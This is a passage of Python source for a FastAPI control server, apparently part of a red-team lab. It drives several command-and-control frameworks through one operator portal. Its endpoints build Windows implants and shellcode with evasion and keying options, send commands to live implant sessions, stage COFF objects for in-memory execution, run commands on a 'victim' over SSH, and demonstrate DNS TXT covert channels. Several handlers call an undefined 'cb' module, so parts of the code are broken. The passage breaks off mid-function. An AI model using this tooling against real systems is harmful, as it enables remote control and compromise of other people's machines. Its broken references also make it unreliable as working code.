"""C2Stack Flight Control & Visual Learning Hub API Server.

Serves the interactive dashboard, manages Docker services, verifies OPSEC redirector
routing, dissects DNS TXT covert channels, and provides cross-framework payload stagers.
"""

from __future__ import annotations

import base64
import http.client
import json
import os
import re
import socket
import subprocess
import urllib.parse
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from fastapi import Depends, FastAPI, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, HTMLResponse, JSONResponse, Response
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel, Field


def verify_operator_auth(request: Request) -> None:
    """Validate operator authentication for control routes when C2STACK_API_KEY is configured."""
    api_key = os.environ.get("C2STACK_API_KEY") or os.environ.get("PORTAL_API_KEY")
    if not api_key:
        return
    token = request.headers.get("X-API-Key")
    if not token:
        auth_hdr = request.headers.get("Authorization", "")
        if auth_hdr.startswith("Bearer "):
            token = auth_hdr[7:].strip()
    if not token or token != api_key:
        raise HTTPException(
            status_code=401,
            detail="Unauthorized: invalid or missing operator API key (provide X-API-Key or Authorization: Bearer <key>)",
        )


app = FastAPI(
    title="C2Stack Flight Control",
    version="3.2.0",
    description="Unified Management & Visual Learning Portal for C2Stack",
)

app.add_middleware(
    CORSMiddleware,
    # The dashboard is served from this same origin, so no cross-origin access
    # is needed. A wildcard origin combined with allow_credentials is invalid
    # per the CORS spec and, if it ever were honoured, would let any page on
    # the host drive the container-control endpoints (start/stop/restart).
    allow_origins=[],
    allow_credentials=False,
    allow_methods=["GET"],
    allow_headers=["Content-Type"],
)

STATIC_DIR = Path(__file__).resolve().parent / "static"
if STATIC_DIR.exists():
    app.mount("/static", StaticFiles(directory=str(STATIC_DIR)), name="static")

# Lab settings resolve through labconfig (UI override > env > default); see
# labconfig.py. Reading them through accessors - not module constants - is
# what makes the values changeable from the UI without restarting anything.
import labconfig  # noqa: E402

REDIRECTOR_HOST = os.environ.get("REDIRECTOR_HOST", "127.0.0.1")


def _cfg(key: str) -> str:
    return labconfig.get(key)


def _cfg_int(key: str, fallback: int) -> int:
    return labconfig.get_int(key, fallback)


def _prefix(framework: str) -> str:
    return _cfg(f"{framework}_uri_prefix")


def _victim_ip() -> str:
    """Victim-facing address implants call back to."""
    return _cfg("victim_redirector_ip")


def _header_pair() -> tuple[str, str]:
    return _cfg("c2_header_name"), _cfg("c2_header_value")


def _prefixes() -> dict[str, str]:
    return {fw: _cfg(f"{fw}_uri_prefix") for fw in
            ("meridian", "sliver", "havoc", "adaptix", "mythic")}


def _ports() -> dict[str, dict[str, Any]]:
    http = f"via redirector :{_cfg_int('redirector_http_port', 80)}"
    return {
        "redirector": {"http": _cfg_int("redirector_http_port", 80),
                       "internal": 80, "type": "Edge Proxy / Decoy"},
        "meridian": {"dns": MERIDIAN_DNS_PORT, "http": http,
                     "type": "HTTP / DNS TXT C2"},
        "sliver": {"control": _cfg_int("sliver_ctrl_port", 31337),
                   "http": http, "type": "Go C2 / In-Memory .NET"},
        "havoc": {"teamserver": _cfg_int("havoc_ts_port", 40056),
                  "http": http, "type": "C++ Demon / EDR Evasion"},
        "adaptix": {"teamserver": _cfg_int("adaptix_ts_port", 4321),
                    "http": http, "type": "Go Multiplayer C2"},
        "mythic": {"ui": _cfg_int("mythic_ui_port", 7443), "http": http,
                   "type": "Extensible Web C2"},
    }


def _victim_base() -> str:
    """http://<victim-ip>:<redirector-port> - the base every stager builds on."""
    return f"http://{_victim_ip()}:{_cfg_int('redirector_http_port', 80)}"


# Legacy aliases kept for the existing call sites below; they are resolved
# per access through the module __getattr__ hook at the bottom of this block
# so a settings change is visible immediately everywhere.
MERIDIAN_DNS_PORT = int(os.environ.get("MERIDIAN_DNS_PORT", "15353"))


def __getattr__(name: str) -> Any:
    """Resolve the historic module-level settings names dynamically.

    External importers (tests, tools) that still do `app.VICTIM_REDIRECTOR_IP`
    keep working, and always see the current configured value rather than
    whatever the environment said at import.
    """
    if name == "VICTIM_REDIRECTOR_IP":
        return _victim_ip()
    if name == "REDIRECTOR_PORT":
        return _cfg_int("redirector_http_port", 80)
    if name == "C2_HEADER_NAME":
        return _cfg("c2_header_name")
    if name == "C2_HEADER_VALUE":
        return _cfg("c2_header_value")
    if name == "MERIDIAN_DNS_DOMAIN":
        return _cfg("meridian_dns_domain")
    if name == "FRAMEWORK_PREFIXES":
        return _prefixes()
    if name == "_ports()":
        return _ports()
    raise AttributeError(f"module {__name__!r} has no attribute {name!r}")


# ============================================================================
# Docker Integration (Socket inside container, CLI fallback on host)
# ============================================================================

class UnixSocketHTTPConnection(http.client.HTTPConnection):
    """HTTP connection over a local Unix domain socket."""

    def __init__(self, socket_path: str, timeout: int = 5) -> None:
        super().__init__("localhost", timeout=timeout)
        self.socket_path = socket_path

    def connect(self) -> None:
        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.connect(self.socket_path)


def query_docker_socket(path: str, method: str = "GET", body: dict[str, Any] | None = None) -> Any:
    """Send an HTTP request directly to Docker's unix socket."""
    sock_path = "/var/run/docker.sock"
    if not os.path.exists(sock_path):
        return None

    conn = UnixSocketHTTPConnection(sock_path, timeout=4)
    try:
        headers = {"Host": "localhost"}
        payload_data = None
        if body is not None:
            headers["Content-Type"] = "application/json"
            payload_data = json.dumps(body)

        conn.request(method, path, body=payload_data, headers=headers)
        response = conn.getresponse()
        raw = response.read().decode("utf-8", errors="replace")
        if response.status in (200, 201, 204):
            return json.loads(raw) if raw.strip().startswith(("{", "[")) else raw
        return None
    except Exception:
        return None
    finally:
        # Always close: previously an exception between connect() and close()
        # leaked the fd until GC (fine on CPython, a real leak elsewhere).
        try:
            conn.close()
        except Exception:
            pass


def get_docker_containers() -> list[dict[str, Any]]:
    """Retrieve running/stopped containers via unix socket or docker CLI fallback."""
    # 1. Try Docker socket (when running inside container)
    socket_res = query_docker_socket("/containers/json?all=1")
    if socket_res and isinstance(socket_res, list):
        return socket_res

    # 2. Try Docker CLI (when running on host e.g. Windows/macOS/Linux host shell)
    import subprocess
    try:
        proc = subprocess.run(
            ["docker", "ps", "--all", "--format", "{{json .}}"],
            capture_output=True,
            text=True,
            timeout=3,
        )
        if proc.returncode == 0 and proc.stdout.strip():
            cli_containers = []
            for line in proc.stdout.strip().splitlines():
                if not line.strip():
                    continue
                try:
                    c = json.loads(line)
                    name = c.get("Names", "").strip()
                    cli_containers.append({
                        "Id": c.get("ID", ""),
                        "Names": [f"/{name}"] if name and not name.startswith("/") else [name],
                        "State": c.get("State", "unknown").lower(),
                        "Status": c.get("Status", ""),
                        "Image": c.get("Image", ""),
                        "Ports": c.get("Ports", ""),
                    })
                except Exception:
                    continue
            return cli_containers
    except Exception:
        pass

    return []


def run_container_lifecycle(container_id: str, action: str) -> bool:
    """Execute lifecycle action via unix socket or docker CLI fallback."""
    if action not in ("start", "stop", "restart"):
        return False

    res = query_docker_socket(f"/containers/{container_id}/{action}", method="POST")
    if res is not None:
        return True

    import subprocess
    try:
        proc = subprocess.run(["docker", action, container_id], capture_output=True, text=True, timeout=10)
        return proc.returncode == 0
    except Exception:
        return False


def get_container_logs(container_id: str, tail: int = 100) -> str:
    """Fetch logs from container via unix socket or docker CLI fallback."""
    logs_raw = query_docker_socket(f"/containers/{container_id}/logs?stdout=1&stderr=1&tail={tail}")
    if logs_raw:
        return str(logs_raw)

    import subprocess
    try:
        proc = subprocess.run(["docker", "logs", "--tail", str(tail), container_id], capture_output=True, text=True, timeout=5)
        out = (proc.stdout or "") + (proc.stderr or "")
        return out if out.strip() else "No recent logs."
    except Exception as e:
        return f"Error reading logs: {e}"


def probe_tcp_port(host: str, port: int, timeout: float = 0.5) -> bool:
    """Test TCP port availability."""
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


def probe_dns_txt_port(host: str, port: int, domain: str, timeout: float = 1.0) -> bool:
    """UDP liveness probe for the Meridian DNS listener.

    Meridian's only published port is UDP (DNS TXT C2), so a TCP connect probe
    always fails and reported the service as down while it was serving. Send a
    `ping.<domain>` TXT query and accept any well-formed answer (QR set, RCODE 0).
    """
    def _encode_name(name: str) -> bytes:
        out = b""
        for label in name.split("."):
            out += bytes([len(label)]) + label.encode("ascii")
        return out + b"\x00"

    header = b"\x12\x34\x01\x00\x00\x01" + b"\x00\x00" * 3
    question = header + _encode_name(domain) + b"\x00\x10\x00\x01"  # QTYPE=TXT, QCLASS=IN
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.settimeout(timeout)
            sock.sendto(question, (host, port))
            data, _ = sock.recvfrom(4096)
    except OSError:
        return False
    return len(data) > 12 and bool(data[2] & 0x80) and (data[3] & 0x0F) == 0


def resolve_host_probe_address() -> str:
    """Published ports live on the Docker host, not in this container's
    namespace. Resolve the host gateway from the default route (falling back
    to loopback) so health probes hit the right interface."""
    try:
        import struct

        with open("/proc/net/route", "r") as f:  # noqa: SIM115
            for line in f.read().splitlines()[1:]:
                parts = line.split()
                if len(parts) >= 3 and parts[1] == "00000000":
                    return socket.inet_ntoa(struct.pack("<I", int(parts[2], 16)))
    except Exception:
        pass
    return "127.0.0.1"


PROBE_HOST = os.environ.get("PROBE_HOST") or resolve_host_probe_address()


# ============================================================================
# Models
# ============================================================================

class RedirectorTestRequest(BaseModel):
    url_path: str = Field(default="/gateway/v1/telemetry", description="Request URI path")
    headers: dict[str, str] = Field(default_factory=dict, description="HTTP Request Headers")
    method: str = Field(default="GET", description="HTTP Method")


class VictimCommandRequest(BaseModel):
    command: str = Field(..., description="Command to run on the victim target over SSH")
    timeout: int = Field(30, description="Seconds before ssh gives up")


class AdaptixListenerRequest(BaseModel):
    name: str = Field("cadre_http", description="Listener instance name")
    # Optional fields fall back to the live lab settings at call time, so a
    # UI change is picked up without the client having to resend them.
    callback_address: str | None = Field(
        None, description="Where the AGENT dials (the redirector). "
                          "Default: <victim IP>:<redirector port>")
    uri: str | None = Field(None, description="Must match ADAPTIX_URI_PREFIX")
    port: int | None = Field(None, description="In-container bind port")
    c2_header: str | None = Field(None, description="Redirector gate header name")
    c2_header_value: str | None = Field(None, description="Gate header value")


class AdaptixAgentRequest(BaseModel):
    agent: str = Field("beacon")
    listener: str = Field("cadre_http", description="Listener INSTANCE name")
    arch: str = Field("x64")
    format: str = Field("Exe")
    sleep: str = Field("30s")
    jitter: int = Field(0, description="Must be 0 on this snapshot (PR #379 bug)")


class AdaptixTaskRequest(BaseModel):
    agent_id: str = Field(..., description="a_id from /api/ops/adaptix/agents")
    cmdline: str = Field(..., description="Raw Adaptix command, e.g. 'whoami'")


class HavocBuildRequest(BaseModel):
    arch: str = Field("x64", description="x64 | x86")
    format: str = Field("Windows Exe",
                        description="Windows Exe | Windows Dll | Windows Shellcode | "
                                    "Windows Service Exe")
    listener: str = Field("c2stack - http", description="Listener instance name")
    sleep: int = Field(5, description="Beacon sleep in seconds")
    jitter: int = Field(15, description="0-100")


@app.get("/api/ops/havoc/sessions")
def ops_havoc_sessions() -> dict[str, Any]:
    """Live Havoc Demon sessions via the raw WebSocket protocol."""
    import havoc_client as hv
    try:
        return {"ok": True, "sessions": hv._run(hv.HavocClient().list_sessions())}
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc


@app.get("/api/ops/havoc/listeners")
def ops_havoc_listeners() -> dict[str, Any]:
    import havoc_client as hv
    try:
        r = hv._run(hv.HavocClient().login_and_scan())
        return {"ok": True, "authenticated": r["authenticated"],
                "listeners": r["listeners"]}
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc


@app.post("/api/ops/havoc/build", dependencies=[Depends(verify_operator_auth)])
def ops_havoc_build(req: HavocBuildRequest) -> dict[str, Any]:
    """Build a Demon payload server-side. No Qt client involved.

    Returns the PE base64-encoded plus the team's build console so failures
    (e.g. a missing cross-compiler) are visible rather than a bare error.
    """
    import havoc_client as hv
    try:
        cfg = hv.demon_config(sleep=req.sleep, jitter=req.jitter)
        result = hv._run(hv.HavocClient().build_payload(
            listener=req.listener, arch=req.arch, fmt=req.format, config=cfg))
        return {
            "ok": True,
            "filename": result["filename"],
            "size": result["size"],
            "base64": base64.b64encode(result["payload"]).decode("ascii"),
            "console": result["console"],
        }
    except hv.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc


class HavocTaskRequest(BaseModel):
    demon_id: str = Field(..., description="Demon session ID")
    command: str = Field(..., description="Console command to execute")
    wait: int = Field(25, description="Seconds to wait for Demon beacon output")


@app.post("/api/ops/havoc/task", dependencies=[Depends(verify_operator_auth)])
def ops_havoc_task_post(req: HavocTaskRequest) -> dict[str, Any]:
    """Task a Havoc session directly via POST."""
    import havoc_client as hv
    try:
        return {"ok": True, "result": hv._run(
            hv.HavocClient().task(req.demon_id, req.command, wait=float(req.wait)))}
    except (cb.BackendError, hv.BackendError, OSError) as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc


@app.get("/api/ops/havoc/task", deprecated=True, dependencies=[Depends(verify_operator_auth)])
def ops_havoc_task(demon_id: str, command: str,
                   wait: int = 25) -> dict[str, Any]:
    """Task a Havoc session directly (deprecated GET: prefer POST /api/ops/havoc/task)."""
    import havoc_client as hv
    try:
        return {"ok": True, "result": hv._run(
            hv.HavocClient().task(demon_id, command, wait=float(wait)))}
    except (cb.BackendError, hv.BackendError, OSError) as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc


class SliverGenerateRequest(BaseModel):
    kind: str = Field("session", description="beacon | session (sessions are "
                                             "taskable immediately; beacons need "
                                             "`interactive` first)")
    c2_url: str | None = Field(
        None, description="Implant callback URL. Default: "
                          "<victim IP>:<redirector port><sliver prefix>")
    target_os: str = Field("windows", description="windows | linux")
    arch: str = Field("amd64", description="amd64 | 386")


@app.get("/api/ops/sliver/beacons")
def ops_sliver_beacons() -> dict[str, Any]:
    """Checked-in Sliver beacons (read-only: beacons take no direct tasks)."""
    import sliver_client as sc
    try:
        return {"ok": True, "beacons": sc.beacons()}
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc


@app.get("/api/ops/sliver/tasks")
def ops_sliver_tasks(beacon_id: str) -> dict[str, Any]:
    """Beacon task states (queued/sent/completed) for async beacon tasking."""
    import sliver_client as sc
    try:
        return {"ok": True, "tasks": sc.beacon_tasks(beacon_id)}
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc


class MythicUploadResponse(BaseModel):
    agent_file_id: str
    filename: str


class MythicBuildRequest(BaseModel):
    output_type: str = Field("WinExe", description="WinExe | Shellcode | Service | Source")
    shellcode_format: str = Field("Binary", description="Donut format for Shellcode")
    shellcode_bypass: str = Field("Continue on fail")
    debug: bool = Field(False)
    adjust_filename: bool = Field(True)
    enable_keying: bool = Field(False)
    keying_method: str = Field("Hostname", description="Hostname | Domain | Registry")
    keying_value: str = Field("", description="Upper-cased at build; Domain compares NETBIOS UserDomainName")
    registry_path: str = Field("")
    registry_value: str = Field("")
    registry_comparison: str = Field("Matches", description="Matches | Contains")
    filename: str = Field("apollo-portal.exe")
    # NOTE: Registry keying is broken upstream (CS1009 on any real path);
    # the endpoint passes values through and reports the build error plainly.


def _mythic_http_c2() -> dict[str, Any]:
    """Working http-profile C2 shape (bare host + full-path post_uri).

    A rooted post_uri REPLACES any base path (HttpProfile.cs ParseURLAndPort),
    so a path-carrying host + "data" silently phones http://host/data into the
    decoy. callback_host carries no port (OPSEC rejects it).
    """
    return {
        "callback_host": f"http://{_victim_ip()}",
        "callback_port": _cfg_int('redirector_http_port', 80),
        "callback_interval": 10,
        "callback_jitter": 23,
        "headers": {_cfg('c2_header_name'): _cfg('c2_header_value')},
        "post_uri": f"{_prefixes()['mythic']}/data",
        "AESPSK": "aes256_hmac",
        "encrypted_exchange_check": True,
        "killdate": "2027-09-07",
        "proxy_host": "",
        "proxy_port": "",
        "proxy_user": "",
        "proxy_pass": "",
    }


@app.post("/api/ops/mythic/build", dependencies=[Depends(verify_operator_auth)])
def ops_mythic_build(req: MythicBuildRequest) -> dict[str, Any]:
    """Submit an Apollo build. Returns immediately with the payload uuid.

    dotnet builds take minutes and would block the single uvicorn worker, so
    submission is sync but the BUILD is async server-side: poll
    GET /api/ops/mythic/build/{uuid} for phase, then fetch the binary from
    GET /api/ops/mythic/payload/{uuid}.
    """
    client = cb.MythicClient()
    params = {
        "output_type": req.output_type,
        "shellcode_format": req.shellcode_format,
        "shellcode_bypass": req.shellcode_bypass,
        "adjust_filename": req.adjust_filename,
        "debug": req.debug,
        "enable_keying": req.enable_keying,
        "keying_method": req.keying_method,
        "keying_value": req.keying_value,
        "registry_path": req.registry_path,
        "registry_value": req.registry_value,
        "registry_comparison": req.registry_comparison,
    }
    definition = {
        "payload_type": "apollo",
        "selected_os": "Windows",
        "filename": req.filename,
        "description": f"portal build {req.output_type}",
        "build_parameters": [{"name": k, "value": v} for k, v in params.items()],
        "c2_profiles": [{"c2_profile": "http",
                         "c2_profile_parameters": _mythic_http_c2()}],
        # Loader commands included so COFF flows work out of the box.
        "commands": ["shell", "whoami", "ls", "ps", "download", "upload",
                     "execute_coff", "register_coff", "register_file",
                     "powershell", "run", "sleep", "exit"],
    }
    try:
        out = client.post(
            "/api/v1.4/createpayload_webhook",
            {"input": {"payloadDefinition": json.dumps(definition)}})
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc
    # Webhook replies arrive as CONCATENATED json objects ({...}{...});
    # find the success chunk carrying the uuid.
    uuid = ""
    for chunk in json.dumps(out).split("}{"):
        try:
            obj = json.loads(chunk if chunk.startswith("{") else "{" + chunk)
            if isinstance(obj, dict) and obj.get("uuid"):
                uuid = obj["uuid"]
        except ValueError:
            continue
    if not uuid:
        raise HTTPException(status_code=502,
                            detail=f"build not queued: {json.dumps(out)[:300]}")
    return {"ok": True, "uuid": uuid,
            "status_url": f"/api/ops/mythic/build/{uuid}"}


@app.get("/api/ops/mythic/build/{uuid}")
def ops_mythic_build_status(uuid: str) -> dict[str, Any]:
    """Build phase for a submitted Apollo payload."""
    import re as _re
    # mythic_psql does no parameter binding: whitelist the uuid shape so a
    # path parameter can never become SQL.
    if not _re.fullmatch(r"[0-9a-fA-F-]{36}", uuid or ""):
        raise HTTPException(status_code=400, detail="malformed payload uuid")
    try:
        rows = cb.mythic_psql(
            "SELECT build_phase, left(build_message, 500), "
            f"left(build_stderr, 500) FROM payload WHERE uuid='{uuid}';",
            ["phase", "message", "stderr"])
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc
    if not rows:
        raise HTTPException(status_code=404, detail="unknown payload uuid")
    r = rows[0]
    out: dict[str, Any] = {"ok": True, "uuid": uuid, "phase": r.get("phase"),
                           "message": (r.get("message") or "")[:500]}
    if r.get("phase") == "error":
        out["stderr"] = (r.get("stderr") or "")[-800:]
    if r.get("phase") == "success":
        out["download_url"] = f"/api/ops/mythic/payload/{uuid}"
    return out


@app.get("/api/ops/mythic/payload/{uuid}")
def ops_mythic_payload(uuid: str):
    """Download a built Apollo payload through the portal (JWT stays inside)."""
    import re as _re
    from fastapi.responses import Response as FastAPIResponse
    if not _re.fullmatch(r"[0-9a-fA-F-]{36}", uuid or ""):
        raise HTTPException(status_code=400, detail="malformed payload uuid")
    client = cb.MythicClient()
    try:
        data = client.get(f"/direct/download/{uuid}", timeout=300)
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc
    return FastAPIResponse(
        content=data, media_type="application/octet-stream",
        headers={"Content-Disposition": f'attachment; filename="apollo-{uuid}.bin"'})


@app.post("/api/ops/mythic/upload", dependencies=[Depends(verify_operator_auth)])
async def ops_mythic_upload(request: Request) -> dict[str, Any]:
    """Stage an operator file (e.g. a COFF .o) in Mythic for tasking.

    Multipart form with a `file` field (same contract as
    task_upload_file_webhook — JSON bodies are rejected with "Missing file
    in form"). Returns the agent_file_id to reference from register_file /
    execute_coff "Use Existing File" flows.
    """
    form = await request.form()
    upload = form.get("file")
    if upload is None or not hasattr(upload, "read"):
        raise HTTPException(status_code=400,
                            detail="multipart form with a `file` field required")
    content = await upload.read()
    filename = getattr(upload, "filename", None) or "upload.bin"
    import urllib.request as _url
    import uuid as _uuid
    boundary = "----x" + _uuid.uuid4().hex
    CRLF = "\r\n"
    body = ((f"--{boundary}{CRLF}Content-Disposition: form-data; "
             f'name="file"; filename="{filename}"{CRLF}'
             f"Content-Type: application/octet-stream{CRLF}{CRLF}").encode()
            + content + CRLF.encode()
            + (f"--{boundary}--{CRLF}").encode())
    client = cb.MythicClient()
    token = client._login()
    req = _url.Request(
        f"{client.endpoint}/api/v1.4/task_upload_file_webhook", data=body,
        headers={"Authorization": f"Bearer {token}",
                 "Content-Type": f"multipart/form-data; boundary={boundary}"},
        method="POST")
    try:
        with _url.urlopen(req, timeout=120) as resp:
            data = json.loads(resp.read().decode("utf-8", "replace"))
    except Exception as exc:
        raise HTTPException(status_code=502, detail=str(exc)[:200]) from exc
    if data.get("status") == "error":
        raise HTTPException(status_code=502, detail=str(data.get("error"))[:200])
    return {"ok": True, "agent_file_id": data.get("agent_file_id"),
            "filename": filename, "size": len(content)}


@app.post("/api/ops/sliver/generate", dependencies=[Depends(verify_operator_auth)])
def ops_sliver_generate(req: SliverGenerateRequest) -> dict[str, Any]:
    """Build a Sliver implant server-side (garble compile, ~40s+).

    The 48 MB binary stays in the sliver container; the response carries the
    `docker cp` retrieval command instead of a giant base64 body.
    """
    import sliver_client as sc
    # Fall back to the live lab settings so the UI only has to send overrides.
    c2_url = req.c2_url or (f"{_victim_ip()}:"
                            f"{_cfg_int('redirector_http_port', 80)}"
                            f"{_prefix('sliver')}")
    try:
        return {"ok": True, **sc.generate(req.kind, c2_url,
                                          req.target_os, req.arch)}
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc


@app.get("/api/ops/catalogues")
def ops_catalogues() -> dict[str, Any]:
    """Tasking vocabularies per framework, for the Operations Console.

    Each catalogue entry is source-derived (Havoc: ConsoleInput.cc +
    CommandSend.cc + teamserver demons.go; Adaptix: beacon_agent
    ax_config.axs; Meridian: implant mtasks; Sliver: implant CLI help).
    Entries carry per-command live-verification state in
    doc/internal/CAPABILITY-MATRIX.md — the catalogue itself asserts shapes,
    not results.
    """
    import adaptix_client as ax
    import havoc_client as hv
    return {
        "havoc": {
            name: {"help": spec["help"], "verified": bool(spec.get("verified"))}
            for name, spec in hv.COMMANDS.items()
        },
        "adaptix": {
            name: {"help": spec["help"], "example": spec["example"]}
            for name, spec in ax.COMMANDS.items()
        },
        "meridian": {
            "exec": {"help": "Run without shell (argv split): exec <cmd...>"},
            "shell": {"help": "Run via /bin/sh -c (Linux) — Windows implants "
                              "lack a shell; prefer exec with cmd.exe"},
            "download": {"help": "Retrieve file: download <remote path>"},
            "upload": {"help": "Send file: upload <local> <remote>"},
            "sleep": {"help": "Beacon profile: sleep <sec> [jitter%]"},
            "exit": {"help": "Ask the implant to exit cleanly"},
        },
        "sliver": {
            "execute": {"help": "Run binary directly (NO shell): "
                                "program [args...]; wrap shell work in "
                                "cmd.exe \"/c ...\""},
            "getuid": {"help": "Session user/SID"},
            "hostname": {"help": "Target hostname (via execute)"},
            "download": {"help": "Fetch file: download <remote> <local>"},
            "upload": {"help": "Send file: upload <local> <remote>"},
            "ps": {"help": "Remote process list"},
            "info": {"help": "Session info"},
        },
        "mythic": {
            "shell": {"help": "ALIAS: params is the RAW command line, not JSON"},
            "powershell": {"help": "Named command (JSON args)"},
            "ls/cd/pwd/cat/download/upload": {"help": "Named FS commands (JSON args)"},
            "execute_coff": {"help": "COFF loader (verified live): upload the "
                             ".o via POST /api/ops/mythic/upload (multipart "
                             "`file` field), register_file it by filename, "
                             "then execute_coff {coff_name, function_name, "
                             "timeout}. Beacon imports need __declspec("
                             "dllimport) or the loader returns status 1"},
            "register_coff/register_file": {"help": "Stage .o files by name "
                                            "(Use Existing File group)"},
        },
    }


class DnsDissectRequest(BaseModel):
    payload_text: str = Field(default="whoami /all", description="Command or message to transmit over DNS TXT")
    domain_suffix: str = Field(default="c2.lab.local", description="DNS C2 zone suffix")
    session_id: str = Field(default="A3F99B", description="Hex or Base32 session identifier")


# ============================================================================
# Routes
# ============================================================================

@app.get("/", response_class=HTMLResponse)
async def serve_index() -> Any:
    """Serve the single page application dashboard."""
    index_path = STATIC_DIR / "index.html"
    if index_path.exists():
        return FileResponse(str(index_path))
    return HTMLResponse("<h1>C2Stack Portal Dashboard</h1><p>Static index.html not found.</p>")


def _find_service_container(
    docker_containers: list[dict[str, Any]],
    service_name: str,
    project_name: str | None = None,
) -> dict[str, Any] | None:
    """Identify container by Compose service/project labels and canonical names.

    Prevents cross-project collisions where similarly named containers or
    substring matches (e.g. 'other-project-sliver-1') would otherwise be selected.
    """
    target_svc = service_name.lower()
    project_env = (project_name or os.environ.get("COMPOSE_PROJECT_NAME") or "c2stack").lower()

    # Pass 1: exact match on com.docker.compose.service AND matching com.docker.compose.project
    for c in docker_containers:
        labels = c.get("Labels") or {}
        lbl_svc = str(labels.get("com.docker.compose.service", "")).lower()
        lbl_prj = str(labels.get("com.docker.compose.project", "")).lower()
        if lbl_svc == target_svc:
            if not lbl_prj or lbl_prj == project_env:
                return c

    # Pass 2: exact match on com.docker.compose.service label
    for c in docker_containers:
        labels = c.get("Labels") or {}
        if str(labels.get("com.docker.compose.service", "")).lower() == target_svc:
            return c

    # Pass 3: canonical compose naming /<project>_<service>_<index> or /<project>-<service>-<index>
    for c in docker_containers:
        for raw_name in c.get("Names", []):
            name = raw_name.lstrip("/").lower()
            parts = name.replace("-", "_").split("_")
            if target_svc in parts and (not project_env or project_env in parts):
                return c

    return None


@app.get("/api/status")
def get_status() -> dict[str, Any]:
    """Return health, published ports, and container states across the stack."""
    docker_containers = get_docker_containers()
    container_map = {}
    for c in docker_containers:
        names = c.get("Names", [])
        state = c.get("State", "unknown").lower()
        status = c.get("Status", "")
        cid = c.get("Id", "")[:12]
        for name in names:
            clean_name = name.lstrip("/").lower()
            container_map[clean_name] = {"id": cid, "state": state, "status": status}

    services_status = {}
    for svc, meta in _ports().items():
        matched_container = None
        target_c = _find_service_container(docker_containers, svc)
        if target_c:
            matched_container = {
                "id": str(target_c.get("Id", ""))[:12],
                "state": target_c.get("State", "unknown").lower(),
                "status": target_c.get("Status", ""),
            }
        else:
            exact = f"-{svc}-"
            for cname, cinfo in container_map.items():
                if exact in cname:
                    matched_container = cinfo
                    break
            if matched_container is None:
                for cname, cinfo in container_map.items():
                    if svc in cname:
                        matched_container = cinfo
                        break

        # Check port reachability (published host ports only; string values
        # like "via redirector :80" describe internal bindings and are skipped)
        is_port_live = False
        port_key = next(
            (k for k in ("control", "teamserver", "ui", "dns", "http") if isinstance(meta.get(k), int)),
            None,
        )
        if port_key == "dns":
            # UDP-only published port: probe it as DNS, not as TCP
            is_port_live = probe_dns_txt_port(PROBE_HOST, meta["dns"], _cfg('meridian_dns_domain'))
        elif port_key is not None:
            is_port_live = probe_tcp_port(PROBE_HOST, meta[port_key])

        # State evaluation: running if docker says running OR if port is responding
        is_running = False
        if matched_container and matched_container["state"] == "running":
            is_running = True
        elif is_port_live:
            is_running = True

        state = "running" if is_running else (matched_container["state"] if matched_container else "stopped")

        services_status[svc] = {
            "name": svc.capitalize(),
            "role": meta["type"],
            "state": state,
            "ports": meta,
            "container": matched_container,
            "port_live": is_port_live,
            "uri_prefix": _prefixes().get(svc),
        }

    return {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "docker_available": bool(docker_containers),
        "redirector_http_port": _cfg_int('redirector_http_port', 80),
        "victim_redirector_ip": _victim_ip(),
        "c2_header": f"{_cfg('c2_header_name')}: {_cfg('c2_header_value')}",
        "services": services_status,
    }


@app.post("/api/containers/{service_name}/action", dependencies=[Depends(verify_operator_auth)])
def container_action(service_name: str, action: str) -> dict[str, Any]:
    """Execute lifecycle action (start/stop/restart) on a C2Stack container."""
    clean_target = service_name.lower()
    if clean_target not in _ports():
        # Allow-list: the endpoint controls Docker, so an unrecognised name must
        # not fall through to a substring match that could hit another container.
        raise HTTPException(status_code=404, detail=f"unknown service '{service_name}'")

    docker_containers = get_docker_containers()
    target_c = _find_service_container(docker_containers, clean_target)
    target_id = target_c.get("Id") if target_c else None

    if not target_id:
        return {
            "status": "unavailable",
            "message": f"Container for service '{service_name}' not found",
            "service": service_name,
        }

    ok = run_container_lifecycle(target_id, action)
    return {"status": "ok" if ok else "error", "action": action, "service": service_name, "container_id": target_id}


@app.get("/api/containers/{service_name}/logs")
def container_logs(service_name: str, tail: int = 100) -> dict[str, Any]:
    """Fetch logs from container via Docker socket or CLI."""
    docker_containers = get_docker_containers()
    clean_target = service_name.lower()
    target_c = _find_service_container(docker_containers, clean_target)
    target_id = target_c.get("Id") if target_c else None

    if not target_id:
        return {
            "service": service_name,
            "status": "unavailable",
            "logs": f"[{datetime.now(timezone.utc).strftime('%H:%M:%S')}] Service '{service_name}' container not currently found in docker ps.",
        }

    logs = get_container_logs(target_id, tail=tail)
    return {"service": service_name, "logs": logs}



@app.post("/api/redirector/test")
def test_redirector_flow(req: RedirectorTestRequest) -> dict[str, Any]:
    """Simulate an incoming packet at Apache port 80 and return the visual routing trace.

    Demonstrates the OPSEC header check (X-Request-ID: cadre-c2) and prefix-based C2 routing.
    """
    has_valid_header = False
    for k, v in req.headers.items():
        if k.lower() == _cfg('c2_header_name').lower() and v.strip() == _cfg('c2_header_value'):
            has_valid_header = True
            break

    trace = [
        {
            "step": 1,
            "title": "Ingress Callback Arrives",
            "node": "Apache Edge Gateway (:80)",
            "detail": f"Incoming {req.method} request to path '{req.url_path}'",
